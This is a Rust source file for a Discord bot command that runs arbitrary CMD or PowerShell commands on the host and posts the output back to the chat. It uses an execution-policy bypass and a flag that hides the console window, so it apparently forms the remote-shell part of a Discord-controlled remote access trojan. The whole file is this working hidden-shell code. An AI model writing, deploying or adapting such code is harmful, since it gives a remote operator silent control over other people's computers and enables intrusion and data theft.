use crate::prelude::*;
use std::process::Stdio;
use std::env;
use tokio::process::Command;
use regex::Regex;

fn expand_env_vars(input: &str) -> String {
    let mut result = input.to_string();
    
    if let Ok(re) = Regex::new(r"%([^%]+)%") {
        result = re.replace_all(&result, |caps: &regex::Captures| {
            let var_name = &caps[1];
            env::var(var_name).unwrap_or_else(|_| caps[0].to_string())
        }).to_string();
    }
    
    if let Ok(re) = Regex::new(r"\$env:([A-Za-z_][A-Za-z0-9_]*)") {
        result = re.replace_all(&result, |caps: &regex::Captures| {
            let var_name = &caps[1];
            env::var(var_name).unwrap_or_else(|_| caps[0].to_string())
        }).to_string();
    }
    
    result
}

#[poise::command(prefix_command, aliases("cmd", "exec"))]
pub async fn shell(
    ctx: PoiseContext<'_>,
    #[description = "Command to execute"]
    #[rest]
    command: Option<String>,
) -> Result<(), Error> {
    let command = match command {
        Some(c) => c,
        None => {
            ctx.say("Usage: `.shell [ps|cmd] <command>`\nDefault: cmd\nSupports: %APPDATA%, %USERPROFILE%, $env:USERPROFILE").await?;
            return Ok(());
        }
    };

    let (shell_type, actual_command) = {
        let trimmed = command.trim();
        if let Some(rest) = trimmed.strip_prefix("ps ") {
            ("ps", rest.to_string())
        } else if let Some(rest) = trimmed.strip_prefix("cmd ") {
            ("cmd", rest.to_string())
        } else {
            ("cmd", command.clone())
        }
    };

    if actual_command.trim().is_empty() {
        ctx.say("ERROR: Command cannot be empty\nUsage: `.shell [ps|cmd] <command>`").await?;
        return Ok(());
    }

    let expanded_command = expand_env_vars(&actual_command);
    let shell_name = if shell_type == "ps" { "PowerShell" } else { "CMD" };
    let reply = ctx.say(format!("Executing [{}]: `{}`", shell_name, expanded_command)).await?;

    let mut cmd = if shell_type == "ps" {
        let mut c = Command::new("powershell");
        c.args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &expanded_command]);
        c
    } else {
        let mut c = Command::new("cmd");
        c.args(["/c", &expanded_command]);
        c
    };

    cmd.stdout(Stdio::piped()).stderr(Stdio::piped());
    
    #[cfg(target_os = "windows")]
    cmd.creation_flags(0x08000000);

    let output = cmd.output().await;

    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let exit_code = output.status.code().unwrap_or(-1);

            let mut result = format!("**[{}] Exit Code:** {}\n", shell_name, exit_code);

            if !stdout.trim().is_empty() {
                let stdout_preview = if stdout.len() > 1500 {
                    format!("{}...[truncated]", &stdout[..1500])
                } else {
                    stdout.to_string()
                };
                result.push_str(&format!("**Output:**\n```\n{}\n```\n", stdout_preview));
            }

            if !stderr.trim().is_empty() {
                let stderr_preview = if stderr.len() > 500 {
                    format!("{}...[truncated]", &stderr[..500])
                } else {
                    stderr.to_string()
                };
                result.push_str(&format!("**Errors:**\n```\n{}\n```", stderr_preview));
            }

            if stdout.trim().is_empty() && stderr.trim().is_empty() {
                result.push_str("*No output*");
            }

            if result.len() > 1900 {
                result = format!("{}...\n[Message truncated]", &result[..1850]);
            }

            reply.edit(ctx, poise::CreateReply::default().content(result)).await?;
        }
        Err(e) => {
            reply.edit(ctx, poise::CreateReply::default()
                .content(format!("ERROR: Failed to execute: {}", e))).await?;
        }
    }

    Ok(())
}
